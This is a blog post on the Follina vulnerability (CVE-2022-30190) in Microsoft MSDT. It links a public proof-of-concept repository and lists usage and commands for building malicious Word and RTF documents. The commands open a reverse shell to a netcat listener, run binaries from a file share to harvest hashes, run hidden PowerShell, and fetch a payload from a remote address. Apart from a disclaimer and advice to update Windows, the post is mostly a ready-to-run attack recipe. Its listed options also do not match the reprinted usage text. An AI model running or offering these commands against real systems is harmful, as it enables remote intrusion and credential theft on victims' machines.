---
title: "Follina Vulnerability"
date: 2022-08-20T08:06:25+06:00
description: New Vulnerability Exploited in the Wild
menu:
  sidebar:
    name: Follina
    identifier: follina-vulneraility
    parent: vulnerabilities
    weight: 30
author:
  name: Vincent M
  image: /images/author/sila.png
tags: ["Basic", "InfoSec"]
categories: ["InfoSec"]
---
### CVE-2022-30190 Microsoft MSDT Vulnerability

A new vulnerability has been discovered in Windows that is critical and can be exploited by attackers.

The vulnerability is called “Follina”, and it affects all versions of Windows from Vista to Windows 10.

This vulnerability is known to have been exploited in the wild, but Microsoft has already released a patch for this vulnerability.

I will be going into an in depth how to guide on how to Exploit the Flaw in my next post to showcase how easy it is for attackers out there.

I will also provide measures of mitigating it with the simplest being updating your windows OS as the vulnerability has been patched

DISCLAIMER: All Information covered in my posts are for Educational purposes ONLY.

### POC

Proof of concept code has been hosted on github. Clone the repo below

>https://github.com/JohnHammond/msdt-follina.git

This POC attacks MSDT using a Microsoft Word doc as a delivery mechanism to stage a payload. In this case the payload is calc

,,,
 USAGE
 usage: follina.py [-h] [--command COMMAND] [--output OUTPUT] [--interface INTERFACE] [--port PORT]

 options:
  -h, --help            show this help message and exit
  --command COMMAND, -c COMMAND
                        command to run on the target (default: calc)
  --output OUTPUT, -o OUTPUT
                        output maldoc file (default: ./follina.doc)
  --interface INTERFACE, -i INTERFACE
                        network interface or IP address to host the HTTP server (default: eth0)
  --port PORT, -p PORT  port to serve the HTTP server (default: 8000)
,,,
Running the following command generates a word document with reverse shell to a nectat listener on port 9001

> python3 follina.py -r 9001

Different options can be passed to the code for a number of scenario attacks
,,,
   bash
Execute a local binary
python .\follina.py -t docx -m binary -b \windows\system32\calc.exe

On linux you may have to escape backslashes
python .\follina.py -t rtf -m binary -b \\windows\\system32\\calc.exe

Execute a binary from a file share (can be used to farm hashes 👀)
python .\follina.py -t docx -m binary -b \\localhost\c$\windows\system32\calc.exe

Execute an arbitrary powershell command
python .\follina.py -t rtf -m command -c "Start-Process c:\windows\system32\cmd.exe -WindowStyle hidden -ArgumentList '/c echo owned > c:\users\public\owned.txt'"

Run the web server on the default interface (all interfaces, 0.0.0.0), but tell the malicious document to retrieve it at http://1.2.3.4/exploit.html
python .\follina.py -t docx -m binary -b \windows\system32\calc.exe -u 1.2.3.4

Only run the webserver on localhost, on port 8080 instead of 80
python .\follina.py -t rtf -m binary -b \windows\system32\calc.exe -H 127.0.0.1 -P 8080
,,,
